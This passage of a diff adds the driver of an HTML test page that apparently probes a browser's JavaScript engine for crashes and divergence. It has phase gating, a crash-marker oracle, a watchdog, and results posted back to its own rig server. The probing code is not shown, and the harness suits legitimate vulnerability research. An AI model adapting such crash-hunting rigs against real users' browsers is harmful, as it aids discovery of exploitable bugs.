+  if (R.p2.verdict === "PRESSURE-CLEAN") { return "PRESSURE-CLEAN"; }
+  return p1clean ? "BASELINE-CONSISTENT" : "UNKNOWN";
+}
+
+/* ------------------------------------------------------------ driver */
+function gateRow() {
+  return "rig=" + (R.gate.rigPhase == null ? "?" : R.gate.rigPhase) +
+         " want=" + (R.gate.requestedPhase == null ? "?" : R.gate.requestedPhase) +
+         " effective=" + R.gate.effectivePhase;
+}
+function run() {
+  setRow("rig-url", location.href);
+  setRow("rig-ua", navigator.userAgent || "(no navigator.userAgent)");
+
+  var prior = checkPriorCrash();
+  if (prior) {
+    R.gate.priorCrash = true;
+    R.gate.priorCrashMarker = prior;
+    setRow("rig-verdict", "PRIOR RUN LEFT ARMED MARKER (crash oracle: " +
+           (prior.tag || "?") + " at " + (prior.ts || "?") + ")");
+  }
+
+  var want = 1;
+  try {
+    var mWant = location.search.match(/[?&]phase=(\d+)/);
+    if (mWant) { want = Math.max(1, Math.min(3, parseInt(mWant[1], 10))); }
+  } catch (e) {}
+  R.gate.requestedPhase = want;
+  getJson(RIG_BASE + "/rig/phase", function (j, err) {
+    if (j && typeof j.phase === "number") {
+      R.gate.rigPhase = j.phase;
+    } else {
+      R.gate.rigPhase = 1;                    /* unreachable gate == safe */
+      R.gate.gateError = err || "unparsable";
+    }
+    R.gate.effectivePhase = Math.min(R.gate.rigPhase, want);
+    setRow("rig-gate", gateRow());
+
+    postReport("env", function (ok, att) {
+      setRow("rig-post", ok ? "sent (env, " + att + " attempt(s))"
+                            : "env POST failed after " + att);
+    });
+
+    phase1(function () {
+      if (R.gate.effectivePhase < 2) { return finish(); }
+      phase2(function () {
+        if (R.gate.effectivePhase < 3) { return finish(); }
+        phase3(function () { finish(); });
+      });
+    });
+  });
+
+  /* watchdog: whatever wedges, the page must still POST a partial result */
+  setTimeout(function () {
+    if (R.stage === "done") { return; }
+    fail("watchdog", "budget exceeded in stage " + R.stage);
+    finish();
+  }, 30000);
+
+  function finish() {
+    if (R.stage === "done") { return; }
+    R.stage = "done";
+    R.verdict = computeVerdict();
+    setRow("rig-verdict", R.verdict);
+    setState(R.verdict.indexOf("SIGNAL") !== -1 ||
+             R.verdict.indexOf("DIVERGENCE") !== -1 ||
+             R.verdict.indexOf("CRASHED") !== -1 ? "HIT" : "DONE",
+             R.verdict.indexOf("SIGNAL") !== -1 ||
+             R.verdict.indexOf("DIVERGENCE") !== -1 ||
+             R.verdict.indexOf("CRASHED") !== -1 ? "hit" : "done");
+    postReport("verdict", function (ok, att) {
+      setRow("rig-post", ok ? "sent (verdict, " + att + " attempt(s))"
+                            : "FAILED after " + att + " attempts");
+    });
+  }
+}
+
+/* expose for wsagent-driven interactive repetition */
+window.__varargs = window.__varargs || {};
+window.__varargs.cfg = CFG;
+window.__varargs.makeShapes = makeShapes;
+window.__varargs.churn = churn;
+
+try {
+  run();
+} catch (e) {
+  fail("driver", e);
+  R.stage = "CRASHED@" + (R.stage || "driver");
+  setState("ORACLE CRASHED", "failed");
+  setRow("rig-verdict", R.stage);
+  try { postReport("crash", function () {}); } catch (e2) {}
+}
+</script>
+</body>
+</html>
